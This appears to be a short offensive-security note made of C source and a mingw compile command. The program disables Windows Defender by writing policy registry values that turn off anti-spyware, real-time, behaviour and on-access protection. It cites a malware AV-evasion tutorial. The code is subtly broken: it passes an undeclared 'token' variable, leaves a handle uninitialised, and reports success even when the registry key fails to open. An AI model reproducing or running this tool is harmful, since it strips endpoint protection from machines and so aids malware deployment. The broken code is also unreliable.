# Windows Defender

```c
#include <stdio.h>
#include <windows.h>

// Check for administrative rights
BOOL isUserAdministrator() {
    BOOL isElevated = FALSE;
    HANDLE handle_token;
    TOKEN_ELEVATION elevation;
    DWORD size;
    if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if(GetTokenInformation(handle_token, TokenElevation, &elevation, sizeof(elevation), &size))
            isElevated = elevation.TokenIsElevated;
    }

    if(handle_token) {
        CloseHandle(handle_token);
        handle_token = NULL;
    }
    return isElevated;
}

// Disable defender via registry
int main(int argc, char *argv[]) {
    HKEY handle_registry_key;
    HKEY new_handle_registry_key;
    DWORD disable = 1;

    if(!isUserAdministrator()) {
        printf("Run as administrator!\n");
        return -1;
    }

    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &handle_registry_key);
    if(result == ERROR_SUCCESS) {
        RegSetValueEx(handle_registry_key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*) &disable, sizeof(disable));
        RegCreateKeyEx(handle_registry_key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_handle_registry_key, 0);
        RegSetValueEx(new_handle_registry_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_handle_registry_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_handle_registry_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_handle_registry_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_handle_registry_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

        RegCloseKey(handle_registry_key);
        RegCloseKey(new_handle_registry_key);
    }

    printf("Windows Defender disabled.\nRestart to apply changes.\n");
    
    return 1;
}
```

```
$ x86_64-w64-mingw32-gcc -O2 disable-windows-defender-registry.c -o disable-windows-defender-registry.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

---
## References

- [Cocomelonc: Disable Windows Defender](https://cocomelonc.github.io/tutorial/2022/06/05/malware-av-evasion-7.html)